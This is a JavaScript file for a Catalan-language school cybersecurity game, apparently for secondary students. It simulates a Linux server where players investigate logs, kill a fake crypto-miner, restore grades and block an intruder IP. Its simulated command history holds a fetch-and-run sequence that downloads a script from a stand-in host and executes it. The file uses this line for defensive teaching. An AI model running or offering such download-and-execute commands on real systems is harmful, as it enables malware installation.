/**
 * CyberFilesystem.js
 * Model virtual de sistema de fitxers Linux per a l'activitat de ciberseguretat (Internivell)
 */

function FSNode(name, type, parent, content) {
    this.name = name;
    this.type = type; // "dir" o "file"
    this.parent = parent || null;
    this.content = content || "";
    this.children = type === "dir" ? {} : null;
    this.permissions = type === "dir" ? "drwxr-xr-x" : "-rw-r--r--";
    this.size = type === "dir" ? 4096 : (content ? content.length : 0);
    this.mtime = new Date().toLocaleTimeString("ca-ES", { hour: "2-digit", minute: "2-digit" });
}

function CyberFilesystem() {
    this.root = new FSNode("", "dir", null);
    this.homePath = "/home/ciberdefensa";
    this.currentDir = null;
    this.commandHistory = [
        "cat /etc/passwd",
        "curl http://malicious-drop.net/payload.sh -o /tmp/virus_miner.sh",
        "chmod +x /tmp/virus_miner.sh",
        "/tmp/virus_miner.sh &",
        "mv /servidor_notes/notes_alumnat.csv /servidor_notes/notes_avaluacio.csv.bloquejat"
    ];
    this.processes = [
        { pid: 1, user: "root", name: "systemd", cpu: "0.1%", mem: "12MB", status: "Actiu" },
        { pid: 142, user: "root", name: "sshd", cpu: "0.0%", mem: "6MB", status: "Actiu" },
        { pid: 880, user: "www-data", name: "apache_servidor", cpu: "1.2%", mem: "34MB", status: "Bloquejat" },
        { pid: 2105, user: "ciberdefensa", name: "bash_terminal", cpu: "0.4%", mem: "18MB", status: "Actiu" },
        { pid: 4092, user: "nullsector", name: "virus_miner.sh", cpu: "98.7%", mem: "142MB", status: "MALICIÓS (Actiu)" }
    ];
    this.firewallRules = [];
    this.initDefaultFilesystem();
}

CyberFilesystem.prototype.initDefaultFilesystem = function() {
    // Crear estructura de carpetes
    var home = this.createDirRecursive("/home/ciberdefensa");
    this.createDirRecursive("/var/log");
    this.createDirRecursive("/tmp");
    this.createDirRecursive("/servidor_notes");
    this.createDirRecursive("/backups");

    // Fitxers a /home/ciberdefensa
    this.createFile(
        "/home/ciberdefensa/missio.txt",
        "===============================================================\n" +
        "   ALERTA DE SEGURETAT DE L'INSTITUT - MISSATGE D'URGÈNCIA     \n" +
        "===============================================================\n\n" +
        "Equip de Ciberdefensa de l'Institut:\n\n" +
        "Aquesta tarda a les 17:30h el servidor del centre ha patit una greu intrusió.\n" +
        "El grup de pirates informàtics «NullSector» ha aconseguit colar-se a la xarxa:\n" +
        " - Han infectat el sistema amb un virus miner que consumeix tota la CPU.\n" +
        " - Han bloquejat el fitxer oficial de les notes de l'avaluació.\n" +
        " - Estan intentant descarregar dades privades a través d'una connexió remota.\n\n" +
        "LA VOSTRA MISSIÓ:\n" +
        "1. Investigueu els fitxers de registre a '/var/log' per trobar la IP del hacker.\n" +
        "2. Neutralitzeu el virus que s'amaga a la carpeta temporal '/tmp'.\n" +
        "3. Recupereu la còpia neta de les notes des de '/backups' cap a '/servidor_notes'.\n" +
        "4. Escanegeu la xarxa amb 'scan' i bloquegeu l'atacant amb el tallafocs ('firewall block').\n\n" +
        "Molta sort! L'institut compta amb vosaltres.\n" +
        "-- El Cap d'Estudis i el Professorat de Tecnologia\n"
    );

    this.createFile(
        "/home/ciberdefensa/guia_ordres.txt",
        "GUIA RÀPIDA DE COMANDAMENTS LINUX PER A CIBERDEFENSA:\n" +
        "-----------------------------------------------------------------\n" +
        " * pwd                 : Mostra en quina carpeta et trobes ara mateix.\n" +
        " * ls                  : Llista els fitxers i subcarpetes de la ubicació actual.\n" +
        " * cd <carpeta>        : Canvia de directori (ex: cd /var/log).\n" +
        " * cd ..               : Torna enrere a la carpeta pare (puja un nivell).\n" +
        " * cat <fitxer>        : Mostra el contingut complet d'un arxiu.\n" +
        " * grep <mot> <fitxer> : Cerca una paraula clau dins d'un fitxer gran.\n" +
        " * ps                  : Mostra els processos i programes en execució.\n" +
        " * kill <PID>          : Atura un procés pel seu número identificador (PID).\n" +
        " * rm <fitxer>         : Esborra un arxiu definitivament.\n" +
        " * mkdir <carpeta>     : Crea una carpeta nova.\n" +
        " * cp <origen> <destí> : Copia un fitxer a un altre lloc.\n" +
        " * mv <origen> <destí> : Mou o reanomena un arxiu.\n" +
        " * scan                : Escaneja la xarxa local de l'institut.\n" +
        " * firewall block <IP> : Bloqueja una adreça IP atacant al tallafocs.\n" +
        " * ajuda               : Mostra l'ajuda contextual de la teva missió actual.\n" +
        " * man <comanda>       : Explica detalladament com funciona qualsevol comanda.\n"
    );

    // Fitxers a /var/log
    this.createFile(
        "/var/log/connexions.log",
        "[17:15:02] Connexió permesa des de 192.168.1.45 (Ordinador Direcció) - Usuari: director\n" +
        "[17:20:18] Connexió permesa des de 192.168.1.20 (Aula Informàtica 1) - Usuari: professor\n" +
        "[17:28:44] Connexió des de 192.168.1.10 (Servidor Local) - Servei web actiu\n" +
        "[17:31:02] Connexió des de 192.168.1.88 - PORT 4444 (Dispositiu desconegut)\n" +
        "[17:31:05] Intent d'accés repetit des de 192.168.1.88 - Port scanning detectat!\n"
    );

    this.createFile(
        "/var/log/intrusio.log",
        "=== REGISTRE D'INTRUSIÓ DEL TALLAFOCS DE L'INSTITUT ===\n" +
        "[17:30:45] ALERTA: Força bruta detectada al port 22 (SSH).\n" +
        "[17:31:12] ALERTA: Accés no autoritzat aconseguit per la IP: 192.168.1.88\n" +
        "[17:31:40] ALERTA: Descàrrega d'arxiu sospitós executada a la carpeta /tmp\n" +
        "[17:32:01] ALERTA: Modificació no autoritzada a /servidor_notes/notes_alumnat.csv\n" +
        "NOTA DE L'ADMINISTRADOR: Bloquegeu immediatament la IP 192.168.1.88 amb el tallafocs!\n"
    );

    // Fitxer maliciós a /tmp
    this.createFile(
        "/tmp/virus_miner.sh",
        "#!/bin/bash\n" +
        "# NullSector CryptoMiner & Ransomware v2.4\n" +
        "# Advertència: Aquest script maliciós s'executa en segon pla consumint CPU.\n" +
        "echo 'Atac en marxa contra el servidor de l'institut...'\n" +
        "while true; do mine_crypto --target=192.168.1.88; done\n"
    );

    // Fitxers a /backups
    this.createFile(
        "/backups/notes_recuperades.csv",
        "NIA,Alumne,Grup,Tecnologia,Digitalització,Estat\n" +
        "102938,Júlia Rovira,1A,8.5,9.0,Aprovat\n" +
        "102939,Marc Soler,1B,7.0,8.5,Aprovat\n" +
        "102940,Laia Puig,2A,9.5,10.0,Excel·lent\n" +
        "102941,Pau Garcia,2B,8.0,8.0,Aprovat\n" +
        "102942,Nerea Vidal,3A,9.0,9.5,Excel·lent\n" +
        "102943,Biel Costa,3B,7.5,8.0,Aprovat\n"
    );

    // Fitxer bloquejat a /servidor_notes
    this.createFile(
        "/servidor_notes/notes_avaluacio.csv.bloquejat",
        "FITXER ENCRIPTAT PER NULLSECTOR.\n" +
        "Totes les vostres notes han estat segrestades. Pagueu 500 Bitcoins o tothom suspendrà l'avaluació!"
    );

    // Establir directori inicial
    this.currentDir = home;
};

CyberFilesystem.prototype.createDirRecursive = function(pathStr) {
    var parts = pathStr.split("/").filter(Boolean);
    var cur = this.root;
    for (var i = 0; i < parts.length; i++) {
        var part = parts[i];
        if (!cur.children[part]) {
            cur.children[part] = new FSNode(part, "dir", cur);
        }
        cur = cur.children[part];
    }
    return cur;
};

CyberFilesystem.prototype.createFile = function(pathStr, content) {
    var parts = pathStr.split("/").filter(Boolean);
    var filename = parts.pop();
    var dir = this.createDirRecursive(parts.length ? "/" + parts.join("/") : "/");
    var fileNode = new FSNode(filename, "file", dir, content);
    dir.children[filename] = fileNode;
    return fileNode;
};

CyberFilesystem.prototype.resolvePath = function(pathStr) {
    if (!pathStr || pathStr === ".") return this.currentDir;
    if (pathStr === "~") pathStr = this.homePath;
    if (pathStr.indexOf("~/") === 0) pathStr = this.homePath + pathStr.substring(1);

    var parts = pathStr.split("/").filter(Boolean);
    var cur = pathStr.charAt(0) === "/" ? this.root : this.currentDir;

    for (var i = 0; i < parts.length; i++) {
        var p = parts[i];
        if (p === ".") continue;
        if (p === "..") {
            if (cur.parent) cur = cur.parent;
            continue;
        }
        if (cur.type !== "dir") return null;
        if (!cur.children[p]) return null;
        cur = cur.children[p];
    }
    return cur;
};

CyberFilesystem.prototype.getNodePath = function(node) {
    if (!node || node === this.root) return "/";
    var path = [];
    var cur = node;
    while (cur && cur.parent) {
        path.unshift(cur.name);
        cur = cur.parent;
    }
    return "/" + path.join("/");
};

CyberFilesystem.prototype.pwd = function() {
    return this.getNodePath(this.currentDir);
};

CyberFilesystem.prototype.cd = function(pathStr) {
    if (!pathStr) {
        return this.cd(this.homePath);
    }
    var target = this.resolvePath(pathStr);
    if (!target) {
        return { success: false, msg: "cd: No s'ha trobat el directori o camí '" + pathStr + "'. Comprova la ruta amb 'ls'." };
    }
    if (target.type !== "dir") {
        return { success: false, msg: "cd: '" + pathStr + "' no és una carpeta, és un fitxer. Per veure el contingut fes: cat " + pathStr };
    }
    this.currentDir = target;
    return { success: true, path: this.pwd() };
};

CyberFilesystem.prototype.ls = function(pathStr, options) {
    var target = pathStr ? this.resolvePath(pathStr) : this.currentDir;
    if (!target) {
        return "ls: No s'ha pogut accedir a '" + pathStr + "': El fitxer o directori no existeix.";
    }
    if (target.type === "file") {
        return target.name;
    }

    var keys = Object.keys(target.children).sort();
    if (keys.length === 0) {
        return "(carpeta buida)";
    }

    var isLong = options && options.indexOf("l") > -1;
    var lines = [];

    for (var i = 0; i < keys.length; i++) {
        var node = target.children[keys[i]];
        if (isLong) {
            var typeColor = node.type === "dir" ? "[[;#7dd3fc;]" : (node.name.indexOf(".sh") > -1 ? "[[;#ff5555;]" : "[[;#e2e8f0;]");
            lines.push(node.permissions + "  " + (node.type === "dir" ? "4096" : (node.size + "B").padStart(6)) + "  " + node.mtime + "  " + typeColor + node.name + (node.type === "dir" ? "/" : "") + "]");
        } else {
            if (node.type === "dir") {
                lines.push("[[;#7dd3fc;]" + node.name + "/]");
            } else if (node.name.indexOf(".sh") > -1 || node.name.indexOf("virus") > -1) {
                lines.push("[[;#ff5555;]" + node.name + "]");
            } else if (node.name.indexOf(".log") > -1) {
                lines.push("[[;#ffb703;]" + node.name + "]");
            } else {
                lines.push(node.name);
            }
        }
    }

    return isLong ? lines.join("\n") : lines.join("   ");
};

CyberFilesystem.prototype.cat = function(pathStr) {
    if (!pathStr) return "cat: Has d'especificar quin fitxer vols llegir (ex: cat missio.txt).";
    var node = this.resolvePath(pathStr);
    if (!node) return "cat: " + pathStr + ": El fitxer no existeix. Fes 'ls' per veure quins arxius hi ha.";
    if (node.type === "dir") return "cat: " + pathStr + ": És una carpeta, no un fitxer. Pots entrar-hi amb 'cd " + pathStr + "'.";
    return node.content || "(fitxer buit)";
};

CyberFilesystem.prototype.mkdir = function(pathStr) {
    if (!pathStr) return "mkdir: Has d'indicar el nom de la nova carpeta (ex: mkdir /servidor_notes/recuperat).";
    var parts = pathStr.split("/").filter(Boolean);
    var newDirName = parts.pop();
    var parentPath = pathStr.charAt(0) === "/" ? "/" + parts.join("/") : (parts.length ? parts.join("/") : ".");
    var parentDir = this.resolvePath(parentPath);

    if (!parentDir || parentDir.type !== "dir") {
        return "mkdir: No es pot crear la carpeta a '" + parentPath + "': Ruta inexistent.";
    }
    if (parentDir.children[newDirName]) {
        return "mkdir: Ja existeix un fitxer o carpeta anomenat '" + newDirName + "'.";
    }

    parentDir.children[newDirName] = new FSNode(newDirName, "dir", parentDir);
    return "S'ha creat correctament el directori: " + newDirName;
};

CyberFilesystem.prototype.touch = function(pathStr) {
    if (!pathStr) return "touch: Has d'indicar quin fitxer vols crear.";
    var parts = pathStr.split("/").filter(Boolean);
    var filename = parts.pop();
    var parentPath = pathStr.charAt(0) === "/" ? "/" + parts.join("/") : (parts.length ? parts.join("/") : ".");
    var parentDir = this.resolvePath(parentPath);

    if (!parentDir || parentDir.type !== "dir") {
        return "touch: Directori de destí no vàlid.";
    }
    if (!parentDir.children[filename]) {
        parentDir.children[filename] = new FSNode(filename, "file", parentDir, "");
    }
    return "Fitxer '" + filename + "' actualitzat / creat.";
};

CyberFilesystem.prototype.rm = function(pathStr, recursive) {
    if (!pathStr) return "rm: Has d'indicar quin arxiu vols esborrar (ex: rm virus_miner.sh).";
    var node = this.resolvePath(pathStr);
    if (!node) return "rm: No es pot esborrar '" + pathStr + "': Fitxer no trobat.";
    if (node === this.root || !node.parent) return "rm: No es pot eliminar l'arrel del sistema.";
    if (node.type === "dir" && !recursive) {
        return "rm: No es pot esborrar '" + pathStr + "': És un directori (utilitza rm -r per carpetes).";
    }

    delete node.parent.children[node.name];
    return "S'ha esborrat definitivament: " + node.name;
};

CyberFilesystem.prototype.cp = function(srcPath, destPath) {
    if (!srcPath || !destPath) return "cp: Sintaxi incorrecta. Ús: cp <origen> <destí>\nExemple: cp notes_recuperades.csv /servidor_notes/recuperat/";
    var src = this.resolvePath(srcPath);
    if (!src) return "cp: Fitxer d'origen '" + srcPath + "' no trobat.";
    if (src.type === "dir") return "cp: L'origen és un directori (aquesta eina només copia fitxers).";

    var dest = this.resolvePath(destPath);
    var destDir = null;
    var destName = src.name;

    if (dest && dest.type === "dir") {
        destDir = dest;
    } else {
        if (destPath.endsWith("/") || destPath.endsWith("/.")) {
            return "cp: No es pot copiar a '" + destPath + "': El directori no existeix.";
        }
        var parts = destPath.split("/").filter(Boolean);
        destName = parts.pop();
        var pPath = destPath.charAt(0) === "/" ? "/" + parts.join("/") : (parts.length ? parts.join("/") : ".");
        destDir = this.resolvePath(pPath);
    }

    if (!destDir || destDir.type !== "dir") {
        return "cp: El directori de destí no existeix.";
    }

    var targetPath = this.getNodePath(destDir);
    var fullDestPath = (targetPath === "/" ? "" : targetPath) + "/" + destName;

    destDir.children[destName] = new FSNode(destName, "file", destDir, src.content);
    return "Fitxer copiat correctament a: " + fullDestPath;
};

CyberFilesystem.prototype.mv = function(srcPath, destPath) {
    if (!srcPath || !destPath) return "mv: Sintaxi incorrecta. Ús: mv <origen> <destí>";
    var src = this.resolvePath(srcPath);
    if (!src) return "mv: No s'ha trobat '" + srcPath + "'.";
    if (src === this.root || !src.parent) return "mv: No es pot moure l'arrel.";

    var dest = this.resolvePath(destPath);
    var destDir = null;
    var newName = src.name;

    if (dest && dest.type === "dir") {
        destDir = dest;
    } else {
        if (destPath.endsWith("/") || destPath.endsWith("/.")) {
            return "mv: No es pot moure a '" + destPath + "': El directori no existeix.";
        }
        var parts = destPath.split("/").filter(Boolean);
        newName = parts.pop();
        var pPath = destPath.charAt(0) === "/" ? "/" + parts.join("/") : (parts.length ? parts.join("/") : ".");
        destDir = this.resolvePath(pPath);
    }

    if (!destDir || destDir.type !== "dir") {
        return "mv: Destinació invàlida: El directori no existeix.";
    }

    delete src.parent.children[src.name];
    src.parent = destDir;
    src.name = newName;
    destDir.children[newName] = src;

    var targetPath = this.getNodePath(destDir);
    var fullDestPath = (targetPath === "/" ? "" : targetPath) + "/" + newName;
    return "Mogut / reanomenat a: " + fullDestPath;
};

CyberFilesystem.prototype.grep = function(query, pathStr) {
    if (!query || !pathStr) return "grep: Ús: grep <paraula> <fitxer>\nExemple: grep ALERTA /var/log/intrusio.log";
    var node = this.resolvePath(pathStr);
    if (!node) return "grep: Fitxer '" + pathStr + "' no trobat.";
    if (node.type === "dir") return "grep: '" + pathStr + "' és un directori. Només es pot cercar dins de fitxers.";

    var lines = (node.content || "").split("\n");
    var qLower = query.toLowerCase();
    var matches = [];

    for (var i = 0; i < lines.length; i++) {
        if (lines[i].toLowerCase().indexOf(qLower) > -1) {
            matches.push("[[;#ffb703;]Línia " + (i + 1) + ":] " + lines[i]);
        }
    }

    if (matches.length === 0) {
        return "grep: No s'ha trobat cap coincidència per a '" + query + "' al fitxer " + node.name;
    }
    return matches.join("\n");
};

CyberFilesystem.prototype.ps = function() {
    var out = [
        "PID    USUARI       CPU%   MEMÒRIA   NOM_PROCÉS          ESTAT",
        "------------------------------------------------------------------"
    ];
    for (var i = 0; i < this.processes.length; i++) {
        var p = this.processes[i];
        var isMalicious = p.name.indexOf("virus") > -1;
        var pColor = isMalicious ? "[[;#ff5555;]" : "[[;#e2e8f0;]";
        var line = (p.pid + "").padEnd(7) + p.user.padEnd(13) + p.cpu.padEnd(7) + p.mem.padEnd(10) + p.name.padEnd(20) + p.status;
        out.push(pColor + line + "]");
    }
    out.push("\n[[;#7dd3fc;]CONSELL DE CIBERSEGURETAT:] Si detectes un procés maliciós, atura'l amb: kill <PID>");
    return out.join("\n");
};

CyberFilesystem.prototype.kill = function(pidStr) {
    if (!pidStr) return "kill: Has d'indicar el PID del procés que vols aturar (ex: kill 4092). Fes 'ps' per veure'ls.";
    var pid = parseInt(pidStr, 10);
    var foundIndex = -1;

    for (var i = 0; i < this.processes.length; i++) {
        if (this.processes[i].pid === pid) {
            foundIndex = i;
            break;
        }
    }

    if (foundIndex === -1) {
        return "kill: No existeix cap procés actiu amb el PID " + pidStr + ". Comprova la llista amb 'ps'.";
    }

    var proc = this.processes[foundIndex];
    this.processes.splice(foundIndex, 1);
    return "[[;#00ffaa;][ÈXIT]] El procés '" + proc.name + "' (PID: " + proc.pid + ") ha estat aturat i desallotjat de la memòria.";
};

CyberFilesystem.prototype.history = function() {
    var lines = ["HISTORIAL D'ORDRES RECENTMENT EXECUTADES AL SERVIDOR:"];
    for (var i = 0; i < this.commandHistory.length; i++) {
        var isHack = this.commandHistory[i].indexOf("malicious") > -1 || this.commandHistory[i].indexOf("bloquejat") > -1;
        var color = isHack ? "[[;#ff5555;]" : "[[;#cbd5e1;]";
        lines.push((i + 1 + "").padStart(3) + "  " + color + this.commandHistory[i] + "]");
    }
    return lines.join("\n");
};

CyberFilesystem.prototype.scan = function() {
    return [
        "==================================================================",
        "   ESCANEIG DE DISPOSITIUS EN XARXA - RANG: 192.168.1.0/24        ",
        "==================================================================",
        "IP             DISPOSITIU                  PORTS OBERTS    ESTAT",
        "------------------------------------------------------------------",
        "192.168.1.1    Router-Gateway-Institut     80, 22          ONLINE",
        "192.168.1.10   Servidor-Notes-Institut     8080, 22        COMPROMÈS",
        "192.168.1.20   Ordinador-Aula-Tecnologia   445             ONLINE",
        "192.168.1.45   Ordinador-Cap-Estudis       80              ONLINE",
        "[[;#ff5555;]192.168.1.88   EQUIP-DESCONEGUT-INTRÚS     4444 (Troià)    ALERTA: INTENT D'INTRUSIÓ ACTIU!]",
        "------------------------------------------------------------------",
        "[[;#7dd3fc;]ACCIÓ URGENT:] Bloqueja immediatament l'atacant amb: firewall block 192.168.1.88"
    ].join("\n");
};

CyberFilesystem.prototype.firewall = function(action, targetIP) {
    if (!action || action === "status") {
        var list = this.firewallRules.length ? this.firewallRules.join(", ") : "(cap IP bloquejada actualment)";
        return "Estat del Tallafocs de l'Institut: ACTIU\nIPs Bloquejades: " + list;
    }
    if (action === "block") {
        if (!targetIP) return "firewall: Has d'indicar la IP a bloquejar (ex: firewall block 192.168.1.88).";
        if (this.firewallRules.indexOf(targetIP) === -1) {
            this.firewallRules.push(targetIP);
        }
        return "[[;#00ffaa;][TALLAFOCS ACTUALITZAT]] L'adreça IP " + targetIP + " ha estat bloquejada permanentment!";
    }
    return "firewall: Acció no reconeguda. Comandes vàlides: firewall status, firewall block <IP>";
};

CyberFilesystem.prototype.man = function(cmd) {
    var manuals = {
        "pwd": "NOM: pwd - Print Working Directory\n" +
               "EXPLICACIÓ: Et diu la teva posició exacta al servidor de l'institut.\n" +
               "EXEMPLE: pwd",

        "ls": "NOM: ls - List\n" +
              "EXPLICACIÓ: Llista tots els fitxers i carpetes que tens davant teu.\n" +
              "OPCIONS:\n" +
              "  ls       (llista ràpida)\n" +
              "  ls -l    (llista detallada amb permisos, mides i dates)\n" +
              "  ls /tmp  (llista el contingut d'una altra carpeta)",

        "cd": "NOM: cd - Change Directory\n" +
              "EXPLICACIÓ: Et permet navegar i canviar de carpeta.\n" +
              "EXEMPLES:\n" +
              "  cd /var/log    (anar a una ruta absoluta)\n" +
              "  cd ..          (pujar un nivell / tornar enrere)\n" +
              "  cd ~           (tornar a la teva carpeta d'inici /home/ciberdefensa)",

        "cat": "NOM: cat - Concatenate and print\n" +
               "EXPLICACIÓ: Llegeix un fitxer de text complet a la pantalla.\n" +
               "EXEMPLE: cat missio.txt",

        "grep": "NOM: grep - Global Regular Expression Print\n" +
                "EXPLICACIÓ: Cerca paraules clau dins d'un fitxer gran sense haver-te de llegir 500 línies.\n" +
                "EXEMPLE: grep ALERTA /var/log/intrusio.log",

        "ps": "NOM: ps - Process Status\n" +
              "EXPLICACIÓ: Mostra els programes que estan funcionant a la memòria RAM del servidor.\n" +
              "EXEMPLE: ps",

        "kill": "NOM: kill - Terminate process\n" +
                "EXPLICACIÓ: Atura de cop un procés perillós o congelat utilitzant el seu PID.\n" +
                "EXEMPLE: kill 4092",

        "rm": "NOM: rm - Remove\n" +
              "EXPLICACIÓ: Esborra definitivament un fitxer perillós o brossa.\n" +
              "EXEMPLE: rm virus_miner.sh",

        "mkdir": "NOM: mkdir - Make Directory\n" +
                 "EXPLICACIÓ: Crea una carpeta nova per organitzar arxius.\n" +
                 "EXEMPLE: mkdir /servidor_notes/recuperat",

        "cp": "NOM: cp - Copy\n" +
              "EXPLICACIÓ: Duplica un fitxer des d'un origen fins a una destinació.\n" +
              "EXEMPLE: cp /backups/notes_recuperades.csv /servidor_notes/recuperat/",

        "mv": "NOM: mv - Move\n" +
              "EXPLICACIÓ: Mou un fitxer o canvia'n el nom.\n" +
              "EXEMPLE: mv fitxer_vell.txt fitxer_nou.txt",

        "scan": "NOM: scan - Network Scanner\n" +
                "EXPLICACIÓ: Escaneja la xarxa local per detectar quins dispositius hi ha connectats.\n" +
                "EXEMPLE: scan",

        "firewall": "NOM: firewall - Tallafocs del sistema\n" +
                    "EXPLICACIÓ: Protegeix el perímetre de l'institut bloquejant adreces IP atacants.\n" +
                    "EXEMPLE: firewall block 192.168.1.88"
    };

    if (!cmd) return "man: Has d'indicar sobre quina comanda vols informació (ex: man cd, man ls, man kill).";
    var cleanCmd = cmd.toLowerCase().trim();
    return manuals[cleanCmd] || "man: No hi ha pàgina de manual per a '" + cmd + "'. Escriu 'ajuda' per veure la llista de comandes.";
};

CyberFilesystem.prototype.serialize = function() {
    function serializeNode(node) {
        var obj = {
            name: node.name,
            type: node.type,
            content: node.content,
            permissions: node.permissions,
            size: node.size,
            mtime: node.mtime
        };
        if (node.type === "dir" && node.children) {
            obj.children = {};
            for (var key in node.children) {
                if (node.children.hasOwnProperty(key)) {
                    obj.children[key] = serializeNode(node.children[key]);
                }
            }
        }
        return obj;
    }

    return {
        root: serializeNode(this.root),
        currentPath: this.pwd(),
        processes: this.processes,
        firewallRules: this.firewallRules,
        commandHistory: this.commandHistory
    };
};

CyberFilesystem.prototype.deserialize = function(data) {
    if (!data || !data.root) return false;

    function deserializeNode(obj, parent) {
        var node = new FSNode(obj.name, obj.type, parent, obj.content);
        node.permissions = obj.permissions || node.permissions;
        node.size = obj.size || node.size;
        node.mtime = obj.mtime || node.mtime;
        if (obj.type === "dir" && obj.children) {
            node.children = {};
            for (var key in obj.children) {
                if (obj.children.hasOwnProperty(key)) {
                    node.children[key] = deserializeNode(obj.children[key], node);
                }
            }
        }
        return node;
    }

    this.root = deserializeNode(data.root, null);
    this.processes = data.processes || this.processes;
    this.firewallRules = data.firewallRules || [];
    this.commandHistory = data.commandHistory || [];
    var target = this.resolvePath(data.currentPath || this.homePath);
    this.currentDir = target && target.type === "dir" ? target : this.resolvePath(this.homePath);
    return true;
};
